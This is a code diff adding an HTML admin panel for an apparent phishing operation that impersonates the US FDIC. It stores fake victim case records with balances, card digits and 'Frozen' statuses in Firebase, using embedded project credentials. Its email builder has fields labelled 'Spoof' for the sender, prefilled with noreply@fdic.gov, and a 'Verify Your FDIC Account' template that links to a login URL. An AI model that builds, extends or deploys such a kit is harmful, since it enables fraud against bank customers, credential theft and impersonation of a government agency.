@@ -1,0 +1,261 @@
+admin.hmtl
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FDIC Admin Panel</title>
+    <style>
+        :root {
+            --fdic-blue: #003366;
+            --bg-color: #f4f7f6;
+            --white: #ffffff;
+            --border: #e0e0e0;
+            --text-dark: #333;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body { background: var(--bg-color); display: flex; height: 100vh; }
+
+        .sidebar { width: 250px; background: var(--fdic-blue); color: var(--white); display: flex; flex-direction: column; }
+        .sidebar-header { padding: 20px; font-size: 20px; font-weight: bold; border-bottom: 1px solid rgba(255,255,255,0.1); }
+        .nav-item { padding: 15px 20px; cursor: pointer; transition: background 0.3s; }
+        .nav-item:hover, .nav-item.active { background: rgba(255,255,255,0.1); }
+
+        .main-content { flex: 1; padding: 30px; overflow-y: auto; }
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+
+        .card { background: var(--white); padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); margin-bottom: 20px; }
+        .form-group { margin-bottom: 15px; }
+        .form-group label { display: block; margin-bottom: 5px; font-weight: 500; }
+        .form-group input, .form-group select, .form-group textarea { width: 100%; padding: 10px; border: 1px solid var(--border); border-radius: 4px; }
+        .btn { padding: 10px 20px; background: var(--fdic-blue); color: var(--white); border: none; border-radius: 4px; cursor: pointer; }
+        .btn:hover { background: #002244; }
+
+        table { width: 100%; border-collapse: collapse; }
+        th, td { padding: 12px; text-align: left; border-bottom: 1px solid var(--border); }
+        th { background: #f9f9f9; font-weight: 600; }
+
+        .email-builder { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        .preview-pane { border: 1px solid var(--border); padding: 20px; background: #fff; min-height: 400px; }
+        .preview-header { border-bottom: 1px solid #eee; padding-bottom: 10px; margin-bottom: 10px; font-size: 14px; }
+        .preview-body { font-size: 14px; line-height: 1.6; }
+    </style>
+</head>
+<body>
+
+<div class="sidebar">
+    <div class="sidebar-header">FDIC Admin</div>
+    <div class="nav-item active" onclick="switchTab('users')">User Management</div>
+    <div class="nav-item" onclick="switchTab('email-builder')">Email Builder</div>
+    <div class="nav-item" onclick="switchTab('logs')">Activity Logs</div>
+</div>
+
+<div class="main-content">
+    <!-- Users Tab -->
+    <div id="tab-users" class="tab-content active">
+        <h2>User Management</h2>
+        <div class="card">
+            <div class="form-group">
+                <label>Username</label>
+                <input type="text" id="adminUsername" placeholder="Enter username">
+            </div>
+            <div class="form-group">
+                <label>Full Name</label>
+                <input type="text" id="adminName" placeholder="Enter full name">
+            </div>
+            <div class="form-group">
+                <label>Balance</label>
+                <input type="number" id="adminBalance" placeholder="0.00">
+            </div>
+            <div class="form-group">
+                <label>Last 4 Digits</label>
+                <input type="text" id="adminLast4" placeholder="0000">
+            </div>
+            <div class="form-group">
+                <label>Case Status</label>
+                <select id="adminStatus">
+                    <option value="Under Review">Under Review</option>
+                    <option value="Frozen">Frozen</option>
+                    <option value="Active">Active</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label>Case Reference ID</label>
+                <input type="text" id="adminCaseRef" placeholder="FD-2026-XXXX">
+            </div>
+            <button class="btn" onclick="saveUser()">Save User</button>
+        </div>
+
+        <div class="card">
+            <h3>Existing Users</h3>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Username</th>
+                        <th>Name</th>
+                        <th>Balance</th>
+                        <th>Status</th>
+                    </tr>
+                </thead>
+                <tbody id="usersTableBody">
+                    <!-- Populated by JS -->
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <!-- Email Builder Tab -->
+    <div id="tab-email-builder" class="tab-content">
+        <h2>Email Template Builder</h2>
+        <div class="card">
+            <div class="email-builder">
+                <div>
+                    <div class="form-group">
+                        <label>Sender Name (Spoof)</label>
+                        <input type="text" id="senderName" value="FDIC Support" oninput="updatePreview()">
+                    </div>
+                    <div class="form-group">
+                        <label>Sender Email (Spoof)</label>
+                        <input type="text" id="senderEmail" value="noreply@fdic.gov" oninput="updatePreview()">
+                    </div>
+                    <div class="form-group">
+                        <label>Subject</label>
+                        <input type="text" id="emailSubject" value="Action Required: Verify Your FDIC Account" oninput="updatePreview()">
+                    </div>
+                    <div class="form-group">
+                        <label>Body HTML (Use {First_Name}, {Balance})</label>
+                        <textarea id="emailBody" rows="10" oninput="updatePreview()">
+Dear {First_Name},
+
+Your FDIC insured account is currently under review. Please log in to verify your details.
+
+Current Balance: ${Balance}
+
+<a href="{Login_URL}" style="background:#003366; color:white; padding:10px 20px; text-decoration:none; border-radius:4px;">View Account</a>
+
+Sincerely,<br>FDIC Safeguard Team
+                        </textarea>
+                    </div>
+                    <button class="btn" onclick="copyHTML()">Copy HTML</button>
+                </div>
+                <div>
+                    <label>Live Preview</label>
+                    <div class="preview-pane">
+                        <div class="preview-header">
+                            <strong>From:</strong> <span id="previewSenderName">FDIC Support</span> (<span id="previewSenderEmail">noreply@fdic.gov</span>)<br>
+                            <strong>Subject:</strong> <span id="previewSubject">Action Required</span>
+                        </div>
+                        <div class="preview-body" id="previewBody">
+                            <!-- Preview Content -->
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Logs Tab -->
+    <div id="tab-logs" class="tab-content">
+        <h2>Activity Logs</h2>
+        <div class="card">
+            <p>Recent activity will appear here.</p>
+        </div>
+    </div>
+</div>
+
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
+  import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";
+
+  const firebaseConfig = {
+  apiKey: "AIzaSyCi1fTBOHYz02MNaVD7aF_1bRlkWu3HgeQ",
+  authDomain: "fdicprotects.firebaseapp.com",
+  projectId: "fdicprotects",
+  storageBucket: "fdicprotects.firebasestorage.app",
+  messagingSenderId: "1087204523962",
+  appId: "1:1087204523962:web:ba359d8cf5981afeab2783"
+};
+
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
+
+  window.switchTab = (tabName) => {
+      document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
+      document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
+      document.getElementById('tab-' + tabName).classList.add('active');
+      event.currentTarget.classList.add('active');
+  };
+
+  window.saveUser = async () => {
+      const username = document.getElementById('adminUsername').value;
+      const name = document.getElementById('adminName').value;
+      const balance = document.getElementById('adminBalance').value;
+      const last4 = document.getElementById('adminLast4').value;
+      const status = document.getElementById('adminStatus').value;
+      const caseRef = document.getElementById('adminCaseRef').value;
+
+      if(!username) return alert("Enter a username");
+
+      await set(ref(db, 'users/' + username), {
+          name: name,
+          balance: parseFloat(balance),
+          last4: last4,
+          status: status,
+          caseRef: caseRef,
+          updatedAt: new Date().toISOString()
+      });
+
+      alert("User Saved!");
+      loadUsers();
+  };
+
+  window.loadUsers = async () => {
+      const snapshot = await get(child(ref(db), 'users'));
+      const tbody = document.getElementById('usersTableBody');
+      tbody.innerHTML = '';
+      if (snapshot.exists()) {
+          Object.keys(snapshot.val()).forEach(key => {
+              const user = snapshot.val()[key];
+              const row = `<tr>
+                  <td>${key}</td>
+                  <td>${user.name || '---'}</td>
+                  <td>$${(user.balance || 0).toLocaleString()}</td>
+                  <td>${user.status || 'Under Review'}</td>
+              </tr>`;
+              tbody.innerHTML += row;
+          });
+      }
+  };
+
+  // Email Builder Functions
+  window.updatePreview = () => {
+      const name = document.getElementById('senderName').value;
+      const email = document.getElementById('senderEmail').value;
+      const subject = document.getElementById('emailSubject').value;
+      const body = document.getElementById('emailBody').value;
+
+      document.getElementById('previewSenderName').innerText = name;
+      document.getElementById('previewSenderEmail').innerText = email;
+      document.getElementById('previewSubject').innerText = subject;
+      document.getElementById('previewBody').innerHTML = body
+          .replace('{First_Name}', 'John Doe')
+          .replace('{Balance}', '12,500.00')
+          .replace('{Login_URL}', 'https://your-link.com');
+  };
+
+  window.copyHTML = () => {
+      const html = document.getElementById('emailBody').value;
+      navigator.clipboard.writeText(html).then(() => {
+          alert("HTML Copied to Clipboard!");
+      });
+  };
+
+  // Load users on start
+  loadUsers();
+  updatePreview();
+</script>
+
+</body>
+</html>
